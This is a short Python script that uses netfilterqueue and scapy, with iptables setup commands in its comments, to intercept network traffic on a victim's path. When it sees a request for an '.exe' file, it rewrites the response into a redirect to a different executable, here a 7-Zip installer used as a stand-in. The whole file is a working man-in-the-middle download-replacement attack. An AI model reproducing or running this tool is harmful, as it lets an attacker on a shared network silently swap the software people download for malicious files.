#!/usr/bin/env python
#execute this command before running programme:- iptables -I FORWARD -j NFQUEUE --queue-num 0
#execute on your own pc by using iptables -I OUTPUT -j NFQUEUE --queue-num 0
#and by using iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables --flush ///to delete
#for https:-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

import netfilterqueue
import scapy.all as scapy

ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # print(scapy_packet.show())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:#for https:10000 and for http 80
            if ".exe" in scapy_packet[scapy.Raw].load and "www.7-zip.org" not in scapy_packet[scapy.Raw].load:
                print("exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 10000:#for https:10000 and for http 80
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+]Replacing file")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.7-zip.org/a/7z1900.exe\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                # del scapy_packet[scapy.TCP].len
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))
                print("[+]File Replaced")
                # print(scapy_packet.show())
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
